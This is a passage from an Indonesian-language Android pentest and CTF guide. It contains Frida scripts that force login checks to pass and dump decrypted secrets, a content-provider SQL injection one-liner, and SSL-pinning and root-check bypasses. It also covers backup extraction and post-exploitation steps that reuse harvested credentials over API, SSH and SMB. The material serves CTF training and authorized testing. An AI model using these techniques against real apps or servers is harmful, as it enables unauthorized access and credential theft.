        
        // BYPASS: Force return true
        console.log("[*] Forcing return: TRUE");
        return true;
    };
    
    // Hook decrypt functions - hunting decrypted flag
    try {
        var CryptoUtils = Java.use("com.insecure.bank.util.CryptoUtils");
        CryptoUtils.decrypt.overload('java.lang.String').implementation = function(encrypted) {
            var decrypted = this.decrypt(encrypted);
            console.log("\n[CRYPTO] Decrypted: " + decrypted);
            return decrypted;
        };
    } catch(e) {}
    
    // Hook String comparisons (untuk flag yang dicek dengan equals)
    var String = Java.use("java.lang.String");
    String.equals.implementation = function(other) {
        var result = this.equals(other);
        var self = this.toString();
        if (self.includes("flag") || self.includes("CTF") || self.includes("HTB") ||
            (other && other.toString().includes("flag"))) {
            console.log("\n[STRING COMPARE] this: " + self + " | other: " + other + " | result: " + result);
        }
        return result;
    };
});
FRIDA

frida -U -f "$PKG" -l ~/mobile_pentest/"$APP_NAME"/frida/hook_specific.js --no-pause
```

**OUTPUT BERHASIL ✅ — Password terlogging:**

text

```
[!] verifyPassword() called!
[+] Input password: wrongpass123
[+] Original return: false
[*] Forcing return: TRUE

[STRING COMPARE] this: picoCTF{h4rdc0d3d} | other: wrongpass123 | result: false
```

➡️ Password yang benar adalah isi dari `this`: `picoCTF{h4rdc0d3d}`

---

### Langkah 6.2 — Hook Crypto & Dump Decrypted Data

Bash

```
cat > ~/mobile_pentest/"$APP_NAME"/frida/hook_crypto.js << 'FRIDA'
Java.perform(function () {
    console.log("[*] Crypto hook script loaded");
    
    // Hook javax.crypto.Cipher untuk intercept encrypt/decrypt
    var Cipher = Java.use("javax.crypto.Cipher");
    
    Cipher.doFinal.overload('[B').implementation = function(input) {
        var result = this.doFinal(input);
        
        // Convert bytes to string
        var inputStr = Java.use('java.lang.String').$new(input);
        var resultStr = Java.use('java.lang.String').$new(result);
        
        console.log("\n[CIPHER.doFinal]");
        console.log("[+] Operation: " + (this.getOpmode() == 1 ? "ENCRYPT" : "DECRYPT"));
        console.log("[+] Algorithm: " + this.getAlgorithm());
        console.log("[+] Input: " + inputStr);
        console.log("[+] Output: " + resultStr);
        
        return result;
    };
    
    // Hook Base64 decode untuk lihat data yang di-decode
    var Base64 = Java.use("android.util.Base64");
    Base64.decode.overload('[B', 'int').implementation = function(input, flags) {
        var result = this.decode(input, flags);
        var decoded = Java.use('java.lang.String').$new(result);
        console.log("\n[BASE64 DECODE] Input: " + Java.use('java.lang.String').$new(input));
        console.log("[BASE64 DECODE] Output: " + decoded);
        return result;
    };
    
    // Hook MessageDigest (SHA/MD5 hashing)
    var MessageDigest = Java.use("java.security.MessageDigest");
    MessageDigest.update.overload('[B').implementation = function(input) {
        var inputStr = Java.use('java.lang.String').$new(input);
        console.log("\n[HASH INPUT] Algorithm: " + this.getAlgorithm() + " | Data: " + inputStr);
        return this.update(input);
    };
});
FRIDA

frida -U -f "$PKG" -l ~/mobile_pentest/"$APP_NAME"/frida/hook_crypto.js --no-pause
# Lakukan aktivitas di app: login, buka fitur, submit form
```

**OUTPUT BERHASIL ✅:**

text

```
[CIPHER.doFinal]
[+] Operation: DECRYPT
[+] Algorithm: AES/CBC/PKCS5Padding
[+] Input: [encrypted bytes]
[+] Output: HTB{fr1d4_h00k_c1ph3r_succ3ss_4ll_th3_w4y}

[BASE64 DECODE] Input: ZmxhZ3tiYXNlNjRfZGVjb2RlZH0=
[BASE64 DECODE] Output: flag{base64_decoded}
```

---

### Langkah 6.3 — Dump SharedPreferences & Runtime Data via Frida

Bash

```
cat > ~/mobile_pentest/"$APP_NAME"/frida/dump_runtime.js << 'FRIDA'
Java.perform(function () {
    
    // Dump semua SharedPreferences saat app berjalan
    var ActivityThread = Java.use('android.app.ActivityThread');
    var context = ActivityThread.currentApplication().getApplicationContext();
    var File = Java.use('java.io.File');
    
    var sharedPrefsDir = File.$new(context.getApplicationInfo().dataDir.value + "/shared_prefs");
    var files = sharedPrefsDir.list();
    
    if (files) {
        console.log("[*] Dumping " + files.length + " SharedPreferences files...");
        for (var i = 0; i < files.length; i++) {
            var fileName = files[i].replace(".xml", "");
            var prefs = context.getSharedPreferences(fileName, 0);
            var allEntries = prefs.getAll();
            console.log("\n[PREFS] " + fileName + ":");
            console.log(JSON.stringify(allEntries));
        }
    }
    
    // Hook SharedPreferences.getString untuk real-time monitoring
    var SharedPrefs = Java.use("android.content.SharedPreferences");
    // Note: Interface, perlu implementasi spesifik
});
FRIDA

frida -U -f "$PKG" -l ~/mobile_pentest/"$APP_NAME"/frida/dump_runtime.js --no-pause 2>/dev/null | head -50
```

---

## ═══════════════════════════════════════

## FASE 7: AUTOMATED ANALYSIS (MobSF)

## ═══════════════════════════════════════

> **Kapan pakai:** Untuk overview cepat semua kerentanan, atau saat tidak tahu harus mulai dari mana.

### Langkah 7.1 — Run MobSF

Bash

```
# Start MobSF container
sudo docker run -d --name mobsf \
  -p 8000:8000 \
  opensecurity/mobile-security-framework-mobsf:latest

sleep 10  # Tunggu startup
echo "[*] MobSF running at http://localhost:8000"

# Ambil API key dari log
API_KEY=$(sudo docker logs mobsf 2>&1 | grep "REST API Key:" | awk '{print $NF}' | tr -d '\r')
echo "[*] API Key: $API_KEY"

# Upload APK
UPLOAD_RESP=$(curl -s \
  -F "file=@$APK_FILE" \
  -H "Authorization: $API_KEY" \
  "http://localhost:8000/api/v1/upload")
HASH=$(echo "$UPLOAD_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['hash'])")
echo "[*] APK Hash: $HASH"

# Trigger scan
curl -s -X POST \
  -H "Authorization: $API_KEY" \
  --data "hash=$HASH" \
  "http://localhost:8000/api/v1/scan" > /dev/null

# Download report
curl -s \
  -H "Authorization: $API_KEY" \
  "http://localhost:8000/api/v1/report_json?hash=$HASH" \
  > ~/mobile_pentest/"$APP_NAME"/output/mobsf_report.json

echo "[*] Report saved. Parsing high-severity issues..."
cat ~/mobile_pentest/"$APP_NAME"/output/mobsf_report.json | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
print('Security Score:', data.get('security_score', 'N/A'))
findings = data.get('manifest_analysis', {}).get('manifest_findings', [])
for f in findings:
    if f.get('severity') in ['high', 'critical']:
        print(f'[HIGH] {f.get(\"title\")}: {f.get(\"description\",\"\")[:80]}')
" 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
Security Score: 35/100
[HIGH] Exported Activity without Permission: AdminActivity exported without android:permission
[HIGH] Debuggable Application: android:debuggable=true found
[HIGH] Backup Enabled: android:allowBackup=true - data extractable without root
[HIGH] Hardcoded Secret: API key found in strings.xml
```

➡️ Prioritaskan findings dengan severity HIGH/CRITICAL. Cocokkan dengan workflow di atas.

---

## ═══════════════════════════════════════

## FASE 8: POST-EXPLOITATION & PIVOT

## ═══════════════════════════════════════

> **Masuk sini setelah dapat credentials, flag, atau menemukan service backend.**

### Langkah 8.1 — Reuse Credentials ke Service Lain

Bash

```
# Jika dapat credentials dari APK analysis:
export APP_USER="admin"
export APP_PASS="Sup3rS3cur3!"
export API_URL="https://api.insecure-bank.com"  # Dari static analysis

# Test credentials ke API backend
curl -s -X POST "$API_URL/api/v1/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$APP_USER\",\"password\":\"$APP_PASS\"}" \
  | python3 -m json.tool

# Jika ada server IP (dari API endpoint yang ditemukan)
export TARGET=$(echo "$API_URL" | grep -oP '\d+\.\d+\.\d+\.\d+')

# Test credentials ke service lain di server yang sama
nxc ssh $TARGET -u "$APP_USER" -p "$APP_PASS" 2>/dev/null
nxc smb $TARGET -u "$APP_USER" -p "$APP_PASS" 2>/dev/null

# Jika dapat JWT token dari traffic intercept
export JWT_TOKEN="eyJhbGciOiJIUzI1NiJ9..."
# Test ke API endpoint lain
curl -s -H "Authorization: Bearer $JWT_TOKEN" "$API_URL/api/v1/admin/users"
curl -s -H "Authorization: Bearer $JWT_TOKEN" "$API_URL/api/v1/flags"
# → Lanjut ke <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a> dan [🔌 30 — API Security Workflow](/docs/api-security)
```

---

### Langkah 8.2 — Database Backup Extraction (Jika allowBackup=true)

Bash

```
# Method ini tidak perlu root di device!
# Berfungsi di device non-rooted dengan allowBackup=true

# Backup data aplikasi
adb backup -f "$APP_NAME.ab" -noapk "$PKG"
# Ikuti prompt di layar device/emulator

# Extract backup (format Android Backup = Zlib compressed tar)
dd if="$APP_NAME.ab" bs=24 skip=1 | python3 -c "
import sys, zlib
data = sys.stdin.buffer.read()
sys.stdout.buffer.write(zlib.decompress(data))
" > "$APP_NAME.tar"

tar xf "$APP_NAME.tar" -C ~/mobile_pentest/"$APP_NAME"/loot/backup/
ls ~/mobile_pentest/"$APP_NAME"/loot/backup/apps/*/db/
```

---

### Cross-Service Credential Testing Chart

Setelah dapat credentials/token dari Android analysis:

text

```
APK Credentials Found
     │
     ├─ ─→ API Endpoint (HTTP/HTTPS)     → <a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>
     ├──→ JWT Token ditemukan           → <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>
     ├──→ Firebase URL ditemukan        → Test open access: curl firebase_url/.json
     ├──→ AWS Key ditemukan             → <a href="/docs/aws-pentest" class="text-[#00b4d8] hover:underline font-mono font-semibold">60_aws_pentest_workflow.md</a>
     ├──→ Server IP dari API endpoint   → Test SSH/SMB/FTP
     │    ├─ ─→ Port 22  (SSH)           → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     │    ├─ ─→ Port 445 (SMB)           → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     │    └─ ─→ Port 3306 (MySQL)        → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     └──→ Web application backend       → <a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error / Gejala|Penyebab|Solusi|
|---|---|---|
|`INSTALL_FAILED_UPDATE_INCOMPATIBLE`|Signature APK berbeda dari yang sudah install|`adb uninstall $PKG` lalu install ulang|
|`INSTALL_FAILED_VERIFICATION_FAILURE`|Play Protect blokir APK modified|`adb shell settings put global package_verifier_enable 0`|
|`INSTALL_PARSE_FAILED_MANIFEST_MALFORMED`|Syntax XML error di manifest setelah edit|Validasi XML sebelum rebuild: `xmllint --noout AndroidManifest.xml`|
|`apktool: AndrolibException`|Framework cache corrupt|`apktool empty-framework-dir --force`|
|`JADX: inconsistent code`|Bytecode terobfuscasi|Aktifkan `--show-bad-code --deobf`, baca smali langsung|
|`adb: device unauthorized`|USB Debugging belum diizinkan|Buka layar device → Allow → Centang "Always allow"|
|`adb root: not running as root`|Emulator pakai Google Play image|Buat AVD baru dengan "Google APIs" image|
|`Frida: unable to find process`|App belum running / nama salah|Gunakan `-f $PKG` (spawn) bukan `-n`, cek nama via `frida-ps -Ua`|
|`Frida: version mismatch`|Client & server versi berbeda|Samakan versi: download server sesuai `frida --version`|
|`objection: Agent terminated`|Versi Frida tidak match|Lihat error detail, samakan versi client-server|
|`SSL Pinning bypass gagal`|Custom/native implementation|Coba APK patching NetworkSecurityConfig, atau Flutter script|
|`sqlite3: not a database`|Database encrypted (SQLCipher)|Cari key di source, atau hook dengan Frida|
|`am start: SecurityException`|Activity ada permission protection|Perlu APK patching untuk hapus permission requirement|
|`content: Unknown URI`|Path provider salah|Grep `addURI` di source code untuk path yang valid|
|`zipalign: command not found`|Tool belum install|`sudo apt install -y zipalign`|
|`run-as: package not debuggable`|App tidak debuggable|Gunakan emulator root penuh, jangan `run-as`|
|App crash dengan "Device Rooted"|Root detection aktif|Patch smali `isRooted()` return false, atau Frida hook|
|Traffic HTTPS tidak ke Burp|SSL Pinning atau proxy tidak diset|Set proxy di emulator settings + install Burp cert ke system store|

---

## ═══════════════════════════════════════

## 8 COMMON CTF ANDROID PATTERNS — QUICK REFERENCE

## ═══════════════════════════════════════

|#|Pattern|Command Cepat|Expected Output|
|---|---|---|---|
|1|Flag di SharedPrefs|`adb shell "cat /data/data/$PKG/shared_prefs/*.xml"`|`<string name="flag">flag{...}</string>`|
|2|Flag hardcoded di Java|`grep -rnwi static/jadx_java -e "flag{" -e "picoCTF{"`|`if (input.equals("flag{...}"))`|
|3|Exported Activity bypass|`adb shell am start -n "$PKG/.FlagActivity"`|Layar menampilkan flag tanpa login|
|4|SQLi di Content Provider|`adb shell content query --uri "content://$AUTH/x" --where "1=1 UNION SELECT flag FROM secret--"`|`Row: 0 flag=flag{...}`|
|5|Encrypted storage (Frida)|`frida -U -f $PKG -l hook_crypto.js`|`[DECRYPT] Output: flag{...}`|
|6|SSL Pinning bypass + API|`objection -g $PKG explore --startup-command "android sslpinning disable"`|Burp shows `/api/get_flag` → `{"flag":"..."}`|
|7|Root/emu check bypass|Patch smali: `const/4 v0, 0x0 \n return v0`|App runs normally on emulator|
|8|Flag di native lib (.so)|`strings static/smali_decoded/lib/x86_64/*.so \| grep -iE "flag\{\|picoCTF"`|`picoCTF{n4t1v3_l1b_str1ng}`|

---

## MASTER DECISION TREE (RINGKASAN)

text

```
START: Dapat file .APK
│
├─ FASE 0: Identifikasi & Setup
│   ├─ Konfirmasi format (file / unzip -l)
│   ├─ Ekstrak metadata (aapt / apktool)
│   └─ Pastikan emulator root aktif (adb root)
│
├─ FASE 1: Static Analysis — Manifest
│   ├─ [Ada exported Activity]    → am start langsung → dapat flag/bypass login
│   ├─ [Ada exported Provider]    → content query + SQLi → dump data
│   ├─ [Ada exported Receiver]    → am broadcast → trigger hidden feature
│   └─ [Tidak ada exported]       → ke Fase 2
│
├─ FASE 2: Static Analysis — Source Code
│   ├─ [Flag/secret hardcoded]    → DONE! Submit flag
│   ├─ [API endpoint ditemukan]   → test API → ke <a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>
│   ├─ [Crypto logic ditemukan]   → ke Fase 6 (Frida hook crypto)
│   └─ [APK terobfuscasi]         → jadx --deobf, atau langsung ke Fase 3
│
├─ FASE 3: Dynamic Analysis
│   ├─ [Flag bocor ke logcat]     → DONE! adb logcat dump
│   ├─ [Flag di SharedPrefs/DB]   → adb pull + sqlite3/cat
│   └─ [Traffic HTTPS blocked]    → ke Fase 4 (SSL Pinning Bypass)
│
├─ FASE 4: SSL Pinning Bypass
│   ├─ [Objection berhasil]       → Burp intercept → analisis API
│   ├─ [Custom Frida berhasil]    → Burp intercept → analisis API
│   └─ [Semua Frida gagal]        → ke Fase 5 (APK Patching)
│
├─ FASE 5: APK Patching
│   ├─ [Root/emu bypass berhasil] → Dynamic analysis tanpa hambatan
│   └─ [SSL config patched]       → Burp intercept berhasil
│
├─ FASE 6: Frida Scripting
│   ├─ [Auth bypassed]            → dapat akses admin feature
│   ├─ [Crypto hooked]            → dapat plaintext flag
│   └─ [Runtime data dumped]      → credentials, tokens, flags
│
└─ FASE 7-8: MobSF + Post-Exploitation
    └─ [Credentials/token]        → Reuse ke API/SSH/SMB/Web backend
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export APK_FILE="target_app.apk"
export APP_NAME=$(basename "$APK_FILE" .apk)
export PKG="com.target.app"     # Dari: aapt dump badging $APK_FILE
export LHOST="10.10.14.5"
mkdir -p ~/mobile_pentest/"$APP_NAME"/{static,dynamic,frida,output,loot/{creds,keys,db}}

# === STATIC ANALYSIS ===
apktool d "$APK_FILE" -o static/smali_decoded -f              # Decompile ke Smali
jadx -d static/jadx_java "$APK_FILE" --show-bad-code          # Decompile ke Java
grep -n 'android:exported="true"' static/smali_decoded/AndroidManifest.xml   # Cari exported
grep -rnwi static/jadx_java -e "flag{" -e "api_key" -e "secret" -e "password"  # Hunt secrets
grep -rnEo "https?://[a-zA-Z0-9./?=_%-]*" static/jadx_java | sort -u          # API endpoints
find static/smali_decoded/lib/ -name "*.so" -exec strings {} + | grep -iE "flag{"  # Native libs

# === DYNAMIC ANALYSIS ===
adb install -r "$APK_FILE"
adb logcat -c && adb logcat | grep -iE "$PKG|flag|secret|token"               # Monitor log
adb shell "cat /data/data/$PKG/shared_prefs/*.xml"                             # SharedPrefs
adb pull "/data/data/$PKG/databases/" ./loot/db/                               # SQLite DBs
sqlite3 ./loot/db/*.db ".dump" | grep -iE "flag|secret|admin"                 # Query DB

# === COMPONENT EXPLOITATION ===
adb shell am start -n "$PKG/.AdminActivity"                    # Trigger exported activity
adb shell am start -n "$PKG/.AdminActivity" --ez "isAdmin" true               # With param
adb shell content query --uri "content://$PKG.provider/users"                 # Query provider
adb shell content query --uri "content://$PKG.provider/x" --where "1=1 UNION SELECT flag FROM secret--"  # SQLi
adb shell am broadcast -a "com.target.ACTION" -n "$PKG/.Receiver"             # Broadcast

# === FRIDA / OBJECTION ===
adb shell "/data/local/tmp/frida-server &"                     # Start frida-server
frida-ps -Ua                                                   # List running apps
frida -U -f "$PKG" -l ssl_bypass.js --no-pause                # Spawn + script
objection -g "$PKG" explore                                    # Interactive explore
objection -g "$PKG" explore --startup-command "android sslpinning disable"    # SSL bypass

# === APK PATCHING ===
apktool b static/smali_decoded -o patched_unsigned.apk         # Rebuild
zipalign -v -f 4 patched_unsigned.apk patched_aligned.apk      # Align
apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out patched_final.apk patched_aligned.apk  # Sign
adb uninstall "$PKG" && adb install patched_final.apk          # Install

# === MOBSF ===
sudo docker run -d --name mobsf -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
# Upload via http://localhost:8000 atau REST API
```

---

> **➡️ NEXT:** Setelah mendapatkan API endpoint atau credentials dari Android APK, lanjut ke **`[🔌 30 — API Security Workflow](/docs/api-security)`** untuk full API security testing, atau **`[⚡ Quick Start: Urutan Kerja OSINT (Untuk Pemula)](/docs/osint)`** untuk memperluas recon terhadap target.

> **⬅️ PREV:** **`[🚀 Bagian 0: Konteks & Lab Setup](/docs/aws-pentest)`** — AWS infrastructure penetration testing dan IAM privilege escalation.